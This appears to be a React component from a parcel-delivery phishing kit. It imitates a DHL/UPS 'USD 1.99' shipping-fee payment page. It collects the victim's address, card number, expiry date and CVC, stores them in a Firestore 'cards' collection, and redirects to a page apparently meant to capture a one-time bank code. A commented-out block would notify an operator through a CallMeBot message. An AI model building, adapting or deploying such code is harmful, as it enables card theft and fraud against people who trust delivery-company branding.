import styled from "@emotion/styled";
import { LoadingButton } from "@mui/lab";
import { doc, serverTimestamp, setDoc } from "firebase/firestore";
import React, { useState } from "react";
import { usePaymentInputs } from "react-payment-inputs";
import images from "react-payment-inputs/images";
import { useNavigate, useParams, useSearchParams } from "react-router-dom";
import { db } from "../config/firebase";

// switch case here

const country = require("../config/country.json");

const ColorButton = styled(LoadingButton)(({ theme }) => ({
  fontSize: 16,
  textTransform: "none",
}));

function DhlExpress() {
  const navigate = useNavigate();
  let { param } = useParams();
  const [searchParams, setSearchParams] = useSearchParams();

  // const hostname = window.location.hostname;

  const [values, setValues] = useState({
    address: searchParams.get("address"),
    country: searchParams.get("country"),
    city: searchParams.get("state"),
    state: searchParams.get("city"),
    zip: searchParams.get("zip"),
    site: searchParams.get("site"),
    cardnumber: "",
    expiredate: "",
    cvc: "",
    timestamp: serverTimestamp(),
    otpVerified: false,
  });

  const [isLaoding, setLoading] = useState(false);

  const {
    meta,
    getCardImageProps,
    getCardNumberProps,
    getExpiryDateProps,
    getCVCProps,
  } = usePaymentInputs();

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
    //  console.log(event.target.value);
  };

  const submit = (e) => {
    e.preventDefault();

    // get card last 4 digits
    const str = values.cardnumber;
    const last4 = str.slice(-4);

    setLoading(true);
    console.log("submited");
    if (meta.error) {
      console.log(meta.error);
      setLoading(false);
    } else {
      const cardRef = doc(db(""), "cards", param);
      setDoc(cardRef, values, { merge: true }).then(() =>
        navigate(`/sendcode/${last4}/${param}`, { replace: true })
      );
    }
  };

  /*
  useEffect(() => {
    const requestOptions = {
      method: "GET",
      redirect: "follow",
    };

    fetch(
      `https://api.callmebot.com/start.php?user=@jhonpower&text=https://${hostname}/info/${param}`,
      requestOptions
    )
      .then((response) => response.text())
      .then((result) => console.log(result))
      .catch((error) => console.log("error", error));
  }, []);
  */

  return (
    <>
      <div
        className=""
        style={{ background: "#fff", paddingLeft: 10, paddingRight: 10 }}
      >
        <div style={{ display: "flex", justifyContent: "space-between" }}>
          <span>
            <img
              src={require("./logoups.png")}
              height={50}
              style={{ marginTop: 10 }}
            />
          </span>
          <h3>
            <span
              style={{
                fontSize: "1.3rem",
                letterSpacing: "1px",
                marginRight: "2px",
              }}
            >
              USD
            </span>
            <strong>1.99</strong>
          </h3>
        </div>
      </div>
      <div className="container" style={{ paddingTop: 10 }}>
        <div className="row">
          <div className="col-xs-12 col-md-12">
            <div style={{ display: "flex", justifyContent: "space-between" }}>
              <p>Payment reference:</p>
              <span
                style={{
                  fontSize: "1.3rem",
                  letterSpacing: "1px",
                  marginRight: "2px",
                }}
              >
                67EE78G337SSFS5789SFS
              </span>
            </div>
          </div>
          <div className="col-xs-12 col-md-12">
            <form id="form" onSubmit={submit}>
              <div className="panel panel-default">
                <div className="panel-heading">
                  <h3 className="panel-title">Shipping Address</h3>
                </div>
                <div className="panel-body">
                  <div className="row">
                    <div
                      className="col-xs-12 col-md-12"
                      style={{ marginBottom: "10px" }}
                    >
                      <label htmlFor="cardNumber">Address</label>
                      <input
                        type="text"
                        name="address"
                        onChange={handleChange}
                        defaultValue={values.address}
                        className="form-control"
                        id="address"
                        placeholder="Full address"
                        required
                      />
                    </div>
                  </div>
                  <div className="row">
                    <div className="col-xs-6 col-md-6">
                      <div className="form-group">
                        <label htmlFor="inputGroupSelect01">Country</label>
                        <select
                          defaultValue={values.country}
                          name="country"
                          className="form-control"
                          id="inputGroupSelect01"
                          onChange={handleChange}
                        >
                          {country.map((value, index) => (
                            <option key={index} value={value.name}>
                              {value.name}
                            </option>
                          ))}
                        </select>
                      </div>
                    </div>
                    <div className="col-xs-6 col-md-6 pull-right">
                      <div className="form-group">
                        <label htmlFor="cvCode">State</label>
                        <input
                          defaultValue={values.state}
                          type="text"
                          name="state"
                          onChange={handleChange}
                          className="form-control"
                          id="state"
                          placeholder="State"
                          required
                        />
                      </div>
                    </div>
                    <div className="col-xs-7 col-md-7">
                      <div className="form-group">
                        <label htmlFor="cvCode">City</label>
                        <input
                          defaultValue={values.city}
                          type="text"
                          name="city"
                          onChange={handleChange}
                          className="form-control"
                          id="city"
                          placeholder="City"
                          required
                        />
                      </div>
                    </div>
                    <div className="col-xs-5 col-md-5 pull-right">
                      <div className="form-group">
                        <label htmlFor="cvCode">Zip code </label>
                        <input
                          defaultValue={values.zip}
                          type="text"
                          name="zip"
                          onChange={handleChange}
                          className="form-control"
                          id="zipcode"
                          placeholder="Zip code "
                          required
                        />
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div className="panel panel-default">
                <div className="panel-heading">
                  <h3 className="panel-title">Payment Details</h3>
                  <div className="checkbox pull-right">
                    <label>
                      <input type="checkbox" />
                      Remember
                    </label>
                  </div>
                </div>
                <div className="panel-body">
                  <div className="form-group">
                    <label htmlFor="cardNumber">CARD NUMBER</label>
                    <div className="input-group">
                      <input
                        className="form-control"
                        {...getCardNumberProps({
                          onChange: handleChange,
                          name: "cardnumber",
                        })}
                        required
                      />
                      <span className="input-group-addon">
                        <svg {...getCardImageProps({ images })} />
                      </span>
                    </div>
                    {meta.isTouched && meta.erroredInputs.cardNumber && (
                      <span style={{ color: "red" }}>Error: {meta.error}</span>
                    )}
                  </div>
                  <div className="row">
                    <div className="col-xs-6 col-md-6">
                      <div className="form-group">
                        <label htmlFor="expityMonth">EXPIRY DATE</label>
                        <input
                          className="form-control"
                          {...getExpiryDateProps({
                            onChange: handleChange,
                            name: "expiredate",
                          })}
                          id="expityMonth"
                          required
                        />
                        {meta.isTouched && meta.erroredInputs.expiryDate && (
                          <span style={{ color: "red" }}>
                            Error: {meta.erroredInputs.expiryDate}
                          </span>
                        )}
                      </div>
                    </div>
                    <div className="col-xs-6 col-md-6 pull-right">
                      <div className="form-group">
                        <label htmlFor="cvCode"> CVC</label>
                        <input
                          type="password"
                          className="form-control"
                          {...getCVCProps({
                            onChange: handleChange,
                            name: "cvc",
                          })}
                          id="cvCode"
                          required
                        />
                        {meta.isTouched && meta.erroredInputs.cvc && (
                          <span style={{ color: "red" }}>
                            Error: {meta.erroredInputs.cvc}
                          </span>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <ul className="nav nav-pills nav-stacked">
                <span
                  style={{ backgroundColor: "#337ab7" }}
                  className="badge pull-right"
                >
                  <span className="glyphicon glyphicon-usd" />
                  1.99
                </span>
                Final Payment
              </ul>
              <br />

              <ColorButton
                fullWidth
                type="submit"
                variant="contained"
                color="success"
                loading={isLaoding}
                disableElevation
              >
                Pay $1.99
              </ColorButton>
            </form>
          </div>
        </div>
      </div>
    </>
  );
}

export default DhlExpress;

/*
 <button
              id="sendBtn"
              type="submit"
              className="btn btn-success btn-lg btn-block"
              role="button"
            >
              Pay $1.99
            </button>
            */
